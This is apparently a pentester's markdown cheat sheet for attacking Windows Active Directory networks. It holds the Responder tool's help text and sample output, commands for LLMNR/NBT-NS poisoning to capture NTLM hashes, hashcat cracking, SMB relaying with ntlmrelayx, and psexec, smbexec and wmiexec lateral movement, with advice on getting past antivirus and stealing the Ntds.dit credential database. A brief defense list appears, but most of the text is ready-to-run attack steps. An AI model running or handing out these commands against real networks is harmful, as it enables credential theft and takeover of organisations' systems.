# Responder 
## NBT-NS/LLMNR Responder

This tool is first an LLMNR and NBT-NS responder, it will answer to *specific* NBT-NS (NetBIOS Name Service) queries based on their name suffix (see: http://support.microsoft.com/kb/163409). By default, the tool will only answers to File Server Service request, which is for SMB. The concept behind this, is to target our answers, and be stealthier on the network. This also helps to ensure that we don’t break legitimate NBT-NS behavior. You can set the -r option to 1 via command line if you want this tool to answer to the Workstation Service request name suffix.

```
root@kali:~# responder -h
Usage: python /usr/bin/responder -i 10.20.30.40 -b On -r On

Options:
-h, --help show this help message and exit
-A, --analyze Analyze mode. This option allows you to see NBT-NS,
BROWSER, LLMNR requests from which workstation to
which workstation without poisoning anything.
-i 10.20.30.40, --ip=10.20.30.40
The ip address to redirect the traffic to. (usually
yours)
-I eth0, --interface=eth0
Network interface to use
-b Off, --basic=Off Set this to On if you want to return a Basic HTTP
authentication. Off will return an NTLM
authentication.This option is mandatory.
-r Off, --wredir=Off Set this to enable answers for netbios wredir suffix
queries. Answering to wredir will likely break stuff
on the network (like classics 'nbns spoofer' will).
Default value is therefore set to Off
-f Off, --fingerprint=Off
This option allows you to fingerprint a host that
issued an NBT-NS or LLMNR query.
-w On, --wpad=On Set this to On or Off to start/stop the WPAD rogue
proxy server. Default value is Off
-F Off, --ForceWpadAuth=Off
Set this to On or Off to force NTLM/Basic
authentication on wpad.dat file retrieval. This might
cause a login prompt in some specific cases. Default
value is Off
--lm=Off Set this to On if you want to force LM hashing
downgrade for Windows XP/2003 and earlier. Default
value is Off
-v More verbose
responder Usage Example

Specify the IP address to redirect to (-i 192.168.1.202), enabling the WPAD rogue proxy (-w On), answers for netbios wredir (-r On), and fingerprinting (-f On):
```

## Usage Example
```
root@kali:~# responder -i 192.168.1.202 -w On -r On -f On
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS &amp; LLMNR responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface:ALL
Challenge set is:1122334455667788
WPAD Proxy Server is:ON
WPAD script loaded:function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server is:ON
HTTPS Server is:ON
SMB Server is:ON
SMB LM support is set to:OFF
SQL Server is:ON
FTP Server is:ON
IMAP Server is:ON
POP3 Server is:ON
SMTP Server is:ON
DNS Server is:ON
LDAP Server is:ON
FingerPrint Module is:ON
Serving Executable via HTTP&amp;WPAD is:OFF
Always Serving a Specific File via HTTP&amp;WPAD is:OFF
```

# Attacking:
### Data Store:
```
%SystemRoot%\NTDS\Ntds.dit
C:\Windows\NTDS\Ntds.dit
```
always check for this file and grab it. only accessible through the domian controller and contains everything in Active Directory. 


## LLMNR Poisoning: 
#### Responder:
gather hashes over the network passively 
```
sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
```
```
-I interface
-r enable answers for netbios wredir suffix queries
-d enable answers for netbios domain suffix queries
-w start the WPAD rogue proxy server
-v verbose
```
save hashses to file called hashes.txt

#### Hashcat:
using the password file rockyou.txt and the NTLM module to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```
using the password file rockyou.txt to crack passwords
```
hashcat -m 5600 hashes.txt rockyou.txt --force
```

$ hashcat --help | grep SHA

```
   5500 | NetNTLMv1                                        | Network Protocols
   5500 | NetNTLMv1+ESS                                    | Network Protocols
   5600 | NetNTLMv2                                        | Network Protocols
   1000 | NTLM                                             | Operating Systems
   7500 | Kerberos 5 AS-REQ Pre-Auth etype 23              | Network Protocols
  13100 | Kerberos 5 TGS-REP etype 23                      | Network Protocols
  18200 | Kerberos 5 AS-REP etype 23                       | Network Protocols
    100 | SHA1                                             | Raw Hash
  17400 | SHA3-256                                         | Raw Hash
  17500 | SHA3-384                                         | Raw Hash
  17600 | SHA3-512                                         | Raw Hash
```


##### LLMNR Poisoning Defense:
1. Disable LLMNR
2. Disable NBT-NS
3. Require Network Access Control
4. Require strong passwords (phrases) more than 14 characters


## SMB attacks: How do I get Victim to try connecting to attack machine SMB??
edit: /usr/share/responder/Responder.conf
```
SMB = Off
HTTP = Off
```
everything else stays on

#### NMAP
check for open SMB port and check for SMB signing
```
sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
```
look for smb2 enabled but not required (default for desktops)

### ntmlrelayx.py
1. installed with impacket
2. run while responder is running
```
ntmlrelayx.py -tf targets.txt -smb2support -i
```

```
-i interact
-e example.exe: execute example.exe
-c ls: run command ls
```
looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 

#### connecting: requires having cracked a hash
1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
2. if that is getting stopped by antivirus try psexec.py 
``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
3. if that is getting stopped by antivirus try smbexec.py 
``` smbexec.py <domain>.local/<user>:<password>@<ip-address> ```
4. if that is getting stopped by antivirus try wmiexec.py 
``` wmiexec.py <domain>.local/<user>:<password>@<ip-address> ```
5. there is also a powershell version of psexec and other options that might be able to do the same thing. 
